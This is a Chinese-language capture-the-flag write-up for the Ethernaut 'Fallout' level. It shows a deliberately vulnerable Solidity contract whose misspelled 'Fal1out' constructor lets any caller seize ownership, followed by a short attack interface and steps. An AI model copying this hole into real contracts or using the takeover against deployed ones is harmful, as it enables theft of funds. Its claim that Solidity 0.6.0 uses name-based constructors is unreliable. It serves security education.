# Fal1out

Fal1out 這一關要求我們成爲目標合約的owner,考驗的是舊版solidity的一個特性那便是關於合約的constructor name。我們先看一下合約的代碼。

## 合约代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
``` 

## 代码分析
合約代碼中，我們可以看到注釋著constructor的位置：
```
/* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```
如果是新學習solidity的同學可能會覺得很奇怪，這個明明不是定義constructor的語法，但爲什麽這裏注釋constructor呢。這裏要提到一個歷史沿革的問題。在solidity ^0.6.0中，當我們要定義一個合約的constructor，我們需要定義一個與合約名完全相同的function，這個function便是constructor。但到了soldity ^0.8.0之後，定義constructor有了更加明確的寫法，兩者的大致區別如下：
```
pragma solidity ^0.6.0;

contract Foo {
    function Foo () public {
        // constructor
    }
}
```
```
pragma solidity ^0.8.0;

contract Foo {
    constructor () public {
        // constructor
    }
}
```
瞭解了這一點以後，讓我們你回過頭去看代碼，這時我們可以發現代碼中的constructor命名并沒有做到和合約名相同。合約名為`Fallout`, 而constructor名被定義爲了`Fal1out`。這就意味著我們可以通過調用Fal1out來對owner進行修改。


## 攻击代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Fallout {
    function Fal1out() external payable;
}
```

## 攻击过程
1. 使用編譯後的代碼與已經部署的合約進行交互，調用Fal1out()，即完成攻擊。